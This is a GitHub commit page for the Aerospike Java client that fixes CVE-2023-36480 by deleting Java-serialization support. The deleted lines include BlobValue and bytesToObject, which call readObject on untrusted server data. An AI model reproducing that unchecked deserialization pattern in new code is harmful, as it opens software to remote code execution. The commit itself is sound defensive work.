[Permalink](/aerospike/aerospike-client-java/commit/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

[CVE-2023-36480](https://github.com/advisories/GHSA-jj95-55cr-9597 "CVE-2023-36480") CLIENT-2252 Remove all code that used java runtime ser…

[Browse files](/aerospike/aerospike-client-java/tree/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900)
Browse the repository at this point in the history

```
…ialization/deserialization.

Deserialization of java runtime serialized objects has been identified as a security risk by
CodeQL team members [@atorralba](https://github.com/atorralba) (Tony Torralba) and [@joefarebrother](https://github.com/joefarebrother) (Joseph Farebrother).

All existing database objects that are serialized using this serialization format will need to
be converted to a safer format (Aerospike native types, protobuf, msgpack, json, xml ...) using
a previous client version.
```

* Loading branch information

[![@BrianNichols](https://avatars.githubusercontent.com/u/1761530?s=40&v=4)](/BrianNichols)

[BrianNichols](/aerospike/aerospike-client-java/commits?author=BrianNichols "View all commits by BrianNichols")
committed
Jul 25, 2023

1 parent
[f15bfa1](/aerospike/aerospike-client-java/commit/f15bfa18ba3fece17351381df2eb2705c446aaa6)

commit 80c508c

 Show file tree

 Hide file tree

Showing
**15 changed files**
with
**14 additions**
and
**646 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* client/src/com/aerospike/client

  + client/src/com/aerospike/client/Bin.java
    [Bin.java](#diff-f47761229ae1e4c96f14cfc835c7a50f0d34d0eec18f67a14e01540b115daaaa)
  + client/src/com/aerospike/client/Value.java
    [Value.java](#diff-a761f0ac5c095f8b781a97099e6d851b835f24cd1b767cfc2845beb33911eabc)
  + command

    - client/src/com/aerospike/client/command/Buffer.java
      [Buffer.java](#diff-775e564840246d11744ec62e00a3360d270bf4d266fb5e923b83a103edee5e77)
    - client/src/com/aerospike/client/command/ParticleType.java
      [ParticleType.java](#diff-19525cf867240da2c90b16b234b2c62d2edd3d392cca418e44719d413f5f080b)
  + lua

    - client/src/com/aerospike/client/lua/LuaInstance.java
      [LuaInstance.java](#diff-869e1440f9cf1b55e1d9008dd281b8aa17c59b9e29cb7612f01e807e7d03c7e8)
    - client/src/com/aerospike/client/lua/LuaJavaBlob.java
      [LuaJavaBlob.java](#diff-77cff1222d3305049bb23a1592abe5dd03dd7d97f66281cab2cfb9f25f85cba9)
    - client/src/com/aerospike/client/lua/LuaUnpacker.java
      [LuaUnpacker.java](#diff-c2e523a605f2a43e954d7ce8bc4eb4233fc5cb369a3de41936659ced744fadd6)
  + util

    - client/src/com/aerospike/client/util/Packer.java
      [Packer.java](#diff-358b093e614cf440721800580d512243f494f11224161e28bee19d59a3256396)
    - client/src/com/aerospike/client/util/Unpacker.java
      [Unpacker.java](#diff-a469e2a1f48be9de397dd39a58eb1b0b97b198a66341cbc4d15d719150d68625)
* examples/src/com/aerospike/examples

  + examples/src/com/aerospike/examples/Main.java
    [Main.java](#diff-817a608efc73cd6b6b9c5e38724a8a8efc0f61cbccbdc723ebdfa7831c1ce1a4)
  + examples/src/com/aerospike/examples/OperateMap.java
    [OperateMap.java](#diff-f033cc4069da791ae63e6f14e256deab49bc46583bfbb996ae3859548dfc8d10)
  + examples/src/com/aerospike/examples/Serialize.java
    [Serialize.java](#diff-b1f4e647e52ecc63d10fe6b06d611592524ecd03eb5a607ea53ef295268c0217)
* test/src/com/aerospike/test

  + test/src/com/aerospike/test/SuiteSync.java
    [SuiteSync.java](#diff-b1de4496abb59ef3e614552fa76ec14d220f4d1aa55f90c149a88a8b97eabbb7)
  + sync/basic

    - test/src/com/aerospike/test/sync/basic/TestAdd.java
      [TestAdd.java](#diff-23c928f5845a9733209843bcf1acc121c8bffe3b6e85edb65b497b777e3eb4f4)
    - test/src/com/aerospike/test/sync/basic/TestSerialize.java
      [TestSerialize.java](#diff-db9b2e3a1ecfc4d6e37d6565b54e1388254e54e9d24f2d941f733ccee51dcb92)

## There are no files selected for viewing

29 changes: 0 additions & 29 deletions

29
[client/src/com/aerospike/client/Bin.java](#diff-f47761229ae1e4c96f14cfc835c7a50f0d34d0eec18f67a14e01540b115daaaa "client/src/com/aerospike/client/Bin.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900/client/src/com/aerospike/client/Bin.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -240,35 +240,6 @@ public Bin(String name, Value value) { |
|  |  | this.value = value; |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Create bin with an object value. This is the slowest of the Bin constructors because the type |
|  |  | \* must be determined using multiple "instanceof" checks. If the object type is unrecognized, |
|  |  | \* the default java serializer is used. |
|  |  | \* <p> |
|  |  | \* To disable this constructor, set {@link com.aerospike.client.Value#DisableSerializer} to true. |
|  |  | \* |
|  |  | \* @param name bin name, current limit is 15 characters. |
|  |  | \* @param value bin value |
|  |  | \*/ |
|  |  | public Bin(String name, Object value) { |
|  |  | this.name = name; |
|  |  | this.value = Value.get(value); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Create bin with a blob value. The value will be java serialized. |
|  |  | \* This method is faster than the bin object constructor because the blob is converted |
|  |  | \* directly instead of using multiple "instanceof" type checks with a blob default. |
|  |  | \* <p> |
|  |  | \* To disable this method, set {@link com.aerospike.client.Value#DisableSerializer} to true. |
|  |  | \* |
|  |  | \* @param name bin name, current limit is 15 characters. |
|  |  | \* @param value bin value |
|  |  | \*/ |
|  |  | public static Bin asBlob(String name, Object value) { |
|  |  | return new Bin(name, Value.getAsBlob(value)); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Create bin with a null value. This is useful for bin deletions within a record. |
|  |  | \* |
| Expand Down | |  |

111 changes: 1 addition & 110 deletions

111
[client/src/com/aerospike/client/Value.java](#diff-a761f0ac5c095f8b781a97099e6d851b835f24cd1b767cfc2845beb33911eabc "client/src/com/aerospike/client/Value.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900/client/src/com/aerospike/client/Value.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,8 +16,6 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client; |
|  |  |  |
|  |  | import java.io.ByteArrayOutputStream; |
|  |  | import java.io.ObjectOutputStream; |
|  |  | import java.nio.ByteBuffer; |
|  |  | import java.util.Arrays; |
|  |  | import java.util.List; |
| Expand Down  Expand Up | | @@ -52,24 +50,6 @@ public abstract class Value { |
|  |  | \*/ |
|  |  | public static boolean UseBoolBin = true; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Should default object serializer be disabled. If true, an exception will be thrown when |
|  |  | \* a default object serialization is attempted. Default object serialization is triggered |
|  |  | \* when a bin constructed by {@link com.aerospike.client.Bin#Bin(String, Object)} or |
|  |  | \* {@link com.aerospike.client.Bin#asBlob(String, Object)} is used in a write command |
|  |  | \* with an unrecognized object type. |
|  |  | \*/ |
|  |  | public static boolean DisableSerializer = false; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Should default object deserializer be disabled. If true, an exception will be thrown when |
|  |  | \* a default object deserialization is attempted. Default object serialization is triggered |
|  |  | \* when serialized data is read/parsed from the server. DisableDeserializer is separate from |
|  |  | \* DisableSerializer because there may be cases when no new serialization is allowed, but |
|  |  | \* existing serialized objects need to be supported. |
|  |  | \*/ |
|  |  | public static boolean DisableDeserializer = false; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Should the client return a map when {@link com.aerospike.client.cdt.MapReturnType#KEY\_VALUE} |
|  |  | \* is specified in a map read operation and the server returns a list of key/value pairs. |
| Expand Down  Expand Up | | @@ -241,13 +221,6 @@ public static Value get(Value[] value) { |
|  |  | return (value == null)? NullValue.INSTANCE : new ValueArray(value); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Get blob or null value instance. |
|  |  | \*/ |
|  |  | public static Value getAsBlob(Object value) { |
|  |  | return (value == null)? NullValue.INSTANCE : new BlobValue(value); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Get GeoJSON or null value instance. |
|  |  | \*/ |
| Expand Down  Expand Up | | @@ -349,7 +322,7 @@ public static Value get(Object value) { |
|  |  | return new BytesValue(bb.array()); |
|  |  | } |
|  |  |  |
|  |  | return new BlobValue(value); |
|  |  | throw new AerospikeException("Unsupported type: " + value.getClass().getName()); |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
| Expand Down  Expand Up | | @@ -1260,88 +1233,6 @@ public long toLong() { |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Blob value. |
|  |  | \*/ |
|  |  | public static final class BlobValue extends Value { |
|  |  | private final Object object; |
|  |  | private byte[] bytes; |
|  |  |  |
|  |  | public BlobValue(Object object) { |
|  |  | this.object = object; |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public int estimateSize() throws AerospikeException.Serialize { |
|  |  | bytes = serialize(object); |
|  |  | return bytes.length; |
|  |  | } |
|  |  |  |
|  |  | public static byte[] serialize(Object val) { |
|  |  | if (DisableSerializer) { |
|  |  | throw new AerospikeException("Object serializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | try (ByteArrayOutputStream bstream = new ByteArrayOutputStream()) { |
|  |  | try (ObjectOutputStream ostream = new ObjectOutputStream(bstream)) { |
|  |  | ostream.writeObject(val); |
|  |  | } |
|  |  | return bstream.toByteArray(); |
|  |  | } |
|  |  | catch (Throwable e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public int write(byte[] buffer, int offset) { |
|  |  | System.arraycopy(bytes, 0, buffer, offset, bytes.length); |
|  |  | return bytes.length; |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public void pack(Packer packer) { |
|  |  | packer.packBlob(object); |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public void validateKeyType() { |
|  |  | throw new AerospikeException(ResultCode.PARAMETER\_ERROR, "Invalid key type: jblob"); |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public int getType() { |
|  |  | return ParticleType.JBLOB; |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public Object getObject() { |
|  |  | return object; |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public LuaValue getLuaValue(LuaInstance instance) { |
|  |  | return LuaString.valueOf(bytes); |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public String toString() { |
|  |  | return Buffer.bytesToHexString(bytes); |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public boolean equals(Object other) { |
|  |  | return (other != null && |
|  |  | this.getClass().equals(other.getClass()) && |
|  |  | this.object.equals(((BlobValue)other).object)); |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | public int hashCode() { |
|  |  | return object.hashCode(); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | /\*\* |
|  |  | \* GeoJSON value. |
|  |  | \*/ |
| Expand Down | |  |

24 changes: 0 additions & 24 deletions

24
[client/src/com/aerospike/client/command/Buffer.java](#diff-775e564840246d11744ec62e00a3360d270bf4d266fb5e923b83a103edee5e77 "client/src/com/aerospike/client/command/Buffer.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900/client/src/com/aerospike/client/command/Buffer.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -16,8 +16,6 @@ |
|  |  | \*/ |
|  |  | package com.aerospike.client.command; |
|  |  |  |
|  |  | import java.io.ByteArrayInputStream; |
|  |  | import java.io.ObjectInputStream; |
|  |  | import java.math.BigInteger; |
|  |  | import java.nio.charset.StandardCharsets; |
|  |  | import java.util.Arrays; |
| Expand Down  Expand Up | | @@ -69,9 +67,6 @@ public static Object bytesToParticle(int type, byte[] buf, int offset, int len) |
|  |  | case ParticleType.BLOB: |
|  |  | return Arrays.copyOfRange(buf, offset, offset+len); |
|  |  |  |
|  |  | case ParticleType.JBLOB: |
|  |  | return Buffer.bytesToObject(buf, offset, len); |
|  |  |  |
|  |  | case ParticleType.GEOJSON: |
|  |  | return Buffer.bytesToGeoJSON(buf, offset, len); |
|  |  |  |
| Expand Down  Expand Up | | @@ -297,25 +292,6 @@ public static String bytesToHexString(byte[] buf, int offset, int length) { |
|  |  | return sb.toString(); |
|  |  | } |
|  |  |  |
|  |  | public static Object bytesToObject(byte[] buf, int offset, int length) { |
|  |  | if (length <= 0) { |
|  |  | return null; |
|  |  | } |
|  |  |  |
|  |  | if (Value.DisableDeserializer) { |
|  |  | throw new AerospikeException.Serialize("Object deserializer has been disabled"); |
|  |  | } |
|  |  |  |
|  |  | try (ByteArrayInputStream bastream = new ByteArrayInputStream(buf, offset, length)) { |
|  |  | try (ObjectInputStream oistream = new ObjectInputStream(bastream)) { |
|  |  | return oistream.readObject(); |
|  |  | } |
|  |  | } |
|  |  | catch (Throwable e) { |
|  |  | throw new AerospikeException.Serialize(e); |
|  |  | } |
|  |  | } |
|  |  |  |
|  |  | public static Value bytesToLongValue(byte[] buf, int offset, int len) { |
|  |  | long val = 0; |
|  |  |  |
| Expand Down | |  |

13 changes: 2 additions & 11 deletions

13
[client/src/com/aerospike/client/command/ParticleType.java](#diff-19525cf867240da2c90b16b234b2c62d2edd3d392cca418e44719d413f5f080b "client/src/com/aerospike/client/command/ParticleType.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900/client/src/com/aerospike/client/command/ParticleType.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,5 +1,5 @@ |
|  |  | /\* |
|  |  | \* Copyright 2012-2021 Aerospike, Inc. |
|  |  | \* Copyright 2012-2023 Aerospike, Inc. |
|  |  | \* |
|  |  | \* Portions may be licensed to Aerospike, Inc. under one or more contributor |
|  |  | \* license agreements WHICH ARE COMPATIBLE WITH THE APACHE LICENSE, VERSION 2.0. |
| Expand All | | @@ -17,23 +17,14 @@ |
|  |  | package com.aerospike.client.command; |
|  |  |  |
|  |  | /\*\* |
|  |  | \* Bin type for byte[] values. |
|  |  | \* Server particle types. |
|  |  | \*/ |
|  |  | public final class ParticleType { |
|  |  | // Server particle types. Unsupported types are commented out. |
|  |  | public static final int NULL = 0; |
|  |  | public static final int INTEGER = 1; |
|  |  | public static final int DOUBLE = 2; |
|  |  | public static final int STRING = 3; |
|  |  | public static final int BLOB = 4; |
|  |  | //public static final int TIMESTAMP = 5; |
|  |  | //public static final int DIGEST = 6; |
|  |  | public static final int JBLOB = 7; |
|  |  | //public static final int CSHARP\_BLOB = 8; |
|  |  | //public static final int PYTHON\_BLOB = 9; |
|  |  | //public static final int RUBY\_BLOB = 10; |
|  |  | //public static final int PHP\_BLOB = 11; |
|  |  | //public static final int ERLANG\_BLOB = 12; |
|  |  | public static final int BOOL = 17; |
|  |  | public static final int HLL = 18; |
|  |  | public static final int MAP = 19; |
| Expand Down | |  |

6 changes: 1 addition & 5 deletions

6
[client/src/com/aerospike/client/lua/LuaInstance.java](#diff-869e1440f9cf1b55e1d9008dd281b8aa17c59b9e29cb7612f01e807e7d03c7e8 "client/src/com/aerospike/client/lua/LuaInstance.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900/client/src/com/aerospike/client/lua/LuaInstance.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,5 +1,5 @@ |
|  |  | /\* |
|  |  | \* Copyright 2012-2021 Aerospike, Inc. |
|  |  | \* Copyright 2012-2023 Aerospike, Inc. |
|  |  | \* |
|  |  | \* Portions may be licensed to Aerospike, Inc. under one or more contributor |
|  |  | \* license agreements WHICH ARE COMPATIBLE WITH THE APACHE LICENSE, VERSION 2.0. |
| Expand Down  Expand Up | | @@ -171,10 +171,6 @@ public LuaValue getLuaValue(int type, byte[] buf, int offset, int len) throws Ae |
|  |  | System.arraycopy(buf, offset, blob, 0, len); |
|  |  | return new LuaBytes(this, blob); |
|  |  |  |
|  |  | case ParticleType.JBLOB: |
|  |  | Object object = Buffer.bytesToObject(buf, offset, len); |
|  |  | return new LuaJavaBlob(object); |
|  |  |  |
|  |  | case ParticleType.LIST: { |
|  |  | LuaUnpacker unpacker = new LuaUnpacker(this, buf, offset, len); |
|  |  | return unpacker.unpackList(); |
| Expand Down | |  |

30 changes: 0 additions & 30 deletions

30
[client/src/com/aerospike/client/lua/LuaJavaBlob.java](#diff-77cff1222d3305049bb23a1592abe5dd03dd7d97f66281cab2cfb9f25f85cba9 "client/src/com/aerospike/client/lua/LuaJavaBlob.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/f15bfa18ba3fece17351381df2eb2705c446aaa6/client/src/com/aerospike/client/lua/LuaJavaBlob.java)
Edit file

Delete file

Load diff

This file was deleted.

Oops, something went wrong.

Retry

7 changes: 1 addition & 6 deletions

7
[client/src/com/aerospike/client/lua/LuaUnpacker.java](#diff-c2e523a605f2a43e954d7ce8bc4eb4233fc5cb369a3de41936659ced744fadd6 "client/src/com/aerospike/client/lua/LuaUnpacker.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900/client/src/com/aerospike/client/lua/LuaUnpacker.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
|  |  | @@ -1,5 +1,5 @@ |
|  |  | /\* |
|  |  | \* Copyright 2012-2021 Aerospike, Inc. |
|  |  | \* Copyright 2012-2023 Aerospike, Inc. |
|  |  | \* |
|  |  | \* Portions may be licensed to Aerospike, Inc. under one or more contributor |
|  |  | \* license agreements WHICH ARE COMPATIBLE WITH THE APACHE LICENSE, VERSION 2.0. |
| Expand Down  Expand Up | | @@ -46,11 +46,6 @@ protected LuaList getList(List<LuaValue> value) { |
|  |  | return new LuaList(instance, value); |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | protected LuaValue getJavaBlob(Object value) { |
|  |  | return new LuaJavaBlob(value); |
|  |  | } |
|  |  |  |
|  |  | @Override |
|  |  | protected LuaBytes getBlob(byte[] value) { |
|  |  | return new LuaBytes(instance, value); |
| Expand Down | |  |

10 changes: 1 addition & 9 deletions

10
[client/src/com/aerospike/client/util/Packer.java](#diff-358b093e614cf440721800580d512243f494f11224161e28bee19d59a3256396 "client/src/com/aerospike/client/util/Packer.java")

Show comments

[View file](/aerospike/aerospike-client-java/blob/80c508cc5ecb0173ce92d7fab8cfab5e77bd9900/client/src/com/aerospike/client/util/Packer.java)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -27,7 +27,6 @@ |
|  |  |  |
|  |  | import com.aerospike.client.AerospikeException; |
|  |  | import com.aerospike.client.Value; |
|  |  | import com.aerospike.client.Value.BlobValue; |
|  |  | import com.aerospike.client.cdt.MapOrder; |
|  |  | import com.aerospike.client.command.Buffer; |
|  |  | import com.aerospike.client.command.ParticleType; |
| Expand Down  Expand Up | | @@ -206,13 +205,6 @@ public void packParticleBytes(byte[] b, int offset, int length) { |
|  |  | packByteArray(b, offset, length); |
|  |  | } |
|  |  |  |
|  |  | public void packBlob(Object val) { |
|  |  | byte[] bytes = BlobValue.serialize(val); |
|  |  | packByteArrayBegin(bytes.length + 1); |
|  |  | packByte(ParticleType.JBLOB); |
|  |  | packByteArray(bytes, 0, bytes.length); |
|  |  | } |
|  |  |  |
|  |  | public void packGeoJSON(String val) { |
|  |  | byte[] buffer = Buffer.stringToUtf8(val); |
|  |  | packByteArrayBegin(buffer.length + 1); |
| Expand Down  Expand Up | | @@ -323,7 +315,7 @@ public void packObject(Object obj) { |
|  |  | return; |
|  |  | } |
|  |  |  |
|  |  | packBlob(obj); |
|  |  | throw new AerospikeException("Unsupported type: " + obj.getClass().getName()); |
|  |  | } |
|  |  |  |
|  |  | public void packByteBuffer(ByteBuffer bb) { |
| Expand Down | |  |

 Loading

Oops, something went wrong.
 Retry

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `80c508c`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Faerospike%2Faerospike-client-java%2Fcommit%2F80c508cc5ecb0173ce92d7fab8cfab5e77bd9900) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


